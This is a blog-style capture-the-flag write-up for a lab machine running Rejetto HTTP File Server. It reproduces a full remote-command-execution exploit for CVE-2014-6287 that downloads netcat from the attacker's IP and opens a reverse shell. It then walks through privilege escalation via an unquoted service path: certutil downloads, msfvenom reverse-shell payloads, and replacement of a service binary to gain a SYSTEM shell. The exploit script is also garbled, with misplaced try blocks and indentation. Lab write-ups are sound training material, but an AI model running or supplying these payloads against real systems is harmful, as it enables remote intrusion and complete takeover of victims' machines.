---
layout : post 
title: SteelMonutain
date: 2021-04-21 04:43 +0530
tags: [Rejetto HTTP File Server , unquoted paths]
---


on port 8080 ftp vuln Server is running

# exploitaton

```
python expoit.py 10.10.185.51 8080

sudo python -m SimpleHTTPServer 80

```

```python
#!/usr/bin/python

# Exploit Title: HttpFileServer 2.3.x Remote Command Execution

# Google Dork: intext:"httpfileserver 2.3"

# Date: 04-01-2016

# Remote: Yes

# Exploit Author: Avinash Kumar Thapa aka "-Acid"

# Vendor Homepage: http://rejetto.com/

# Software Link: http://sourceforge.net/projects/hfs/

# Version: 2.3.x

# Tested on: Windows Server 2008 , Windows 8, Windows 7

# CVE : CVE-2014-6287

# Description: You can use HFS (HTTP File Server) to send and receive files.

#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.

#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 

 

#Usage : python Exploit.py <Target IP address> <Target Port Number>



#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  

#          You may need to run it multiple times for success!

import urllib2
import sys
try:

def script_create():

		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")
def execute_script():

		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

def nc_run():

		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")



	ip_addr = "10.9.202.83" #local IP address

	local_port = "5555" # Local Port number

	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"

	save= "save|" + vbs

	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"

	exe= "exec|"+vbs2

	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port

	exe1= "exec|"+vbs3

	script_create()

	execute_script()

	nc_run()

except:

	print """[.]Something went wrong..!

	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>

	Don't forgot to change the Local IP address and Port number on the script"""

	
```
# privEsclation

```
 ========================================(Services Information)========================================

  [+] Interesting Services -non Microsoft-
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AppendData/CreateDirectories, Start
    File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
    Advanced SystemCare Service
```

### Privilege Escalation

For this part we are going to use an enumeration tool called WinPEAS : https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS As we previously hosted a web server in port 80 with python, we can download winPEAS in the victim machine through certutil.exe :
```
C:\tmp>certutil.exe -urlcache   -f http://10.11.14.106:80/winPEAS.exe
****  Online  ****
  000000  ...
  072a00
CertUtil: -URLCache command completed successfully.
```
Running winPEAS we find the following lines among its output:
```
AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected                                                                
File Permissions: bill[WriteDataCreateFile]                                       ```                            

This program can lead to an UnquotedServicePath vulnerability, furthermore we have writing permissions in that directory.

Checking exploitdb we found a CVE related to that service : https://www.exploit-db.com/exploits/40577


In order to exploit this vulnerability we need to upload our shellcode inside C:\Program Files (x86)\IObit\ as Advanced.exe so it will be executed before than Advanced SystemCare.exe

Generating the shellcode:

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.14.106 LPORT=4444 -fexe -o Advanced.exe

Uploading it :
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.202.83 LPORT=7777 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```
Finally we only need to restart AdvancedSystemCareService9:


sc stop AdvancedSystemCareService9

copy to path 

```
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

```
sc start AdvancedSystemCareService9
```
After restarting it, a reverse shell as nt authority\system is obtained


```
nc -nvlp 7777     
listening on [any] 7777 ...
connect to [10.9.202.83] from (UNKNOWN) [10.10.29.211] 49223
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```